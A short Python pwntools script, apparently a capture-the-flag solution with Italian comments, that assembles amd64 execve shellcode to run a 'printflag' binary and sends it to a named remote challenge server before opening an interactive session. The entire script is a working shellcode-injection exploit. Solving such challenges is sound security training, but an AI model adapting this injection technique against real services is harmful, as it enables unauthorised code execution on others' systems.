from pwn import *

context.arch = 'amd64'
context.os = 'linux'

HOST = "shellthree.pwn.ccit25.chals.havce.it"
PORT = 1339

r = remote(HOST, PORT)

# Shellcode per eseguire /printflag
shellcode = asm('''
    xor rsi, rsi
    xor rdx, rdx
    lea rdi, [rip+path]
    mov rax, 59
    syscall
    path:
        .ascii "printflag"
        .byte 0
''')

print(f"[+] Lunghezza shellcode: {len(shellcode)} byte")
r.send(shellcode)

# Interazione con la shell (se il binario viene eseguito, dovresti vedere il flag)
r.interactive()
